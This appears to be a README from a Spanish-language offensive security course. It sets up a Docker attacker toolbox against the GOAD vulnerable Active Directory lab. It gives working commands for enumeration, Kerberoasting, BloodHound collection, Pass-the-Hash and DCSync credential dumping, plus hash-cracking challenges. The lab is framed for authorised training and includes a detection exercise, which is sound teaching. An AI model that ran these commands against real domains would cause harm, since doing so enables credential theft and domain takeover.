# Lab: Red Team / Active Directory

Entorno de práctica para la **Parte 7 — Red Team y operaciones ofensivas** (clases 161–180),
en concreto los ataques a **Active Directory** (Kerberoasting, Pass-the-Hash/Ticket,
BloodHound, DCSync, Golden Ticket).

> ⚠️ **Solo entornos propios o autorizados.** Todo lo de esta página se practica contra un
> laboratorio de tu propiedad (VMs locales) o con **autorización explícita por escrito**.
> Atacar un dominio ajeno es delito. Repasa la [Clase 025](../../classes/parte-0-fundamentos-y-prerrequisitos/025-etica-legalidad-alcance-y-divulgacion-responsable/README.md).

## ¿Por qué este lab es distinto?

Un Active Directory real necesita **Windows Server** (controlador de dominio), que no corre
en un contenedor Linux. Por eso el **objetivo** se despliega como máquinas virtuales, y este
`docker compose` te entrega solo la **caja del atacante** (toolbox) con Impacket, netexec y el
ingestor de BloodHound ya instalados.

## 🎯 El objetivo: GOAD (Game of Active Directory)

[GOAD](https://github.com/Orange-Cyberdefense/GOAD) es el laboratorio de AD vulnerable estándar
de la industria: varios Windows Server con bosques, confianzas y decenas de rutas de ataque
preconfiguradas. Despliegue resumido (elige un proveedor):

1. Instala [VirtualBox](https://www.virtualbox.org/) o usa VMware/Proxmox y [Vagrant](https://www.vagrantup.com/).
2. Clona y provisiona:

   ```bash
   git clone https://github.com/Orange-Cyberdefense/GOAD
   cd GOAD
   ./goad.sh -t install -l GOAD -p virtualbox   # tarda; descarga y provisiona las VMs
   ```

3. Anota las IPs de los DC (p. ej. `192.168.56.10`, `192.168.56.11`) y el dominio (`sevenkingdoms.local`).

> ¿Poca RAM? Usa **GOAD-Light** (menos VMs) con `-l GOAD-Light`.

Alternativa sin Windows para practicar solo **enumeración LDAP/Kerberos**: un contenedor
**Samba AD DC** (más limitado, sin la superficie de ataque de Windows). GOAD es la opción
recomendada para el temario completo de la Parte 7.

## 🚀 Levantar la caja del atacante

```bash
cd labs/red-team-ad
docker compose build          # instala el toolset (tarda la primera vez)
docker compose up -d
docker compose exec attacker bash
```

Dentro del contenedor tienes `impacket-*` (GetUserSPNs, secretsdump, psexec…), `netexec`,
`bloodhound-python`, `ldapsearch`, `smbclient`, `nslookup`. Guarda el botín en `/work/loot`
(mapeado a `./loot`).

> En Linux, si el contenedor no alcanza las VMs, descomenta `network_mode: host` en el
> `docker-compose.yml`. En Docker Desktop, ejecuta las herramientas apuntando a la IP del DC.

## 🧭 Recorrido guiado (contra tu GOAD)

Sustituye `DC=192.168.56.10`, `DOMINIO=sevenkingdoms.local`, y credenciales de bajo privilegio
que obtengas por las clases previas.

### 1. Enumeración inicial

```bash
netexec smb $DC                                  # info del host y del dominio
netexec smb $DC -u usuario -p 'Password123' --users
ldapsearch -x -H ldap://$DC -b "dc=sevenkingdoms,dc=local" | head
```

Relaciónalo con la [Clase 170 — Active Directory: enumeración](../../classes/parte-7-red-team-y-operaciones-ofensivas/170-active-directory-enumeracion/README.md).

### 2. Kerberoasting

```bash
impacket-GetUserSPNs $DOMINIO/usuario:'Password123' -dc-ip $DC -request
```

Crackea el TGS obtenido con Hashcat (modo 13100) y repasa la
[Clase 171](../../classes/parte-7-red-team-y-operaciones-ofensivas/171-active-directory-kerberoasting-y-ataques-a-kerberos/README.md).

### 3. Recolección con BloodHound

```bash
bloodhound-python -u usuario -p 'Password123' -d $DOMINIO -ns $DC -c all
```

Carga el resultado en BloodHound y busca rutas hacia *Domain Admins*
([Clase 173](../../classes/parte-7-red-team-y-operaciones-ofensivas/173-bloodhound-y-analisis-de-rutas-de-ataque/README.md)).

### 4. Movimiento lateral y dominio

Con un hash NTLM, prueba Pass-the-Hash y, si consigues privilegios, DCSync:

```bash
netexec smb $DC -u admin -H <hash_ntlm>                       # Pass-the-Hash
impacket-secretsdump $DOMINIO/admin@$DC -hashes :<hash_ntlm>   # DCSync / volcado
```

Clases [172](../../classes/parte-7-red-team-y-operaciones-ofensivas/172-active-directory-pass-the-hash-y-pass-the-ticket/README.md)
y [174](../../classes/parte-7-red-team-y-operaciones-ofensivas/174-compromiso-total-de-dominio-dcsync-y-golden-ticket/README.md).

## 🏆 Retos verificables

1. **Kerberoasting:** obtén y crackea al menos un TGS de una cuenta de servicio. *Aceptación:* recuperas su contraseña en texto claro.
2. **Ruta a DA:** con BloodHound, documenta una ruta completa desde tu usuario inicial hasta *Domain Admins*. *Aceptación:* la ruta es reproducible paso a paso.
3. **DCSync:** vuelca el hash de `krbtgt`. *Aceptación:* explicas por qué ese hash permite un Golden Ticket.
4. **Detección (purple):** por cada ataque, indica qué evento/telemetría lo delata (relaciónalo con la Parte 8).

## 🧯 Apagar y limpiar

```bash
docker compose down          # apaga la caja del atacante
# Las VMs de GOAD se gestionan aparte:  cd GOAD && vagrant halt / vagrant destroy
```

## 🔗 Referencias

- [GOAD — Game of Active Directory](https://github.com/Orange-Cyberdefense/GOAD)
- [Impacket](https://github.com/fortra/impacket) · [NetExec](https://www.netexec.wiki/) · [BloodHound](https://bloodhound.readthedocs.io/)
- [The Hacker Recipes — Active Directory](https://www.thehacker.recipes/)
- Parte 7 del programa — [índice de clases](../../classes/README.md)
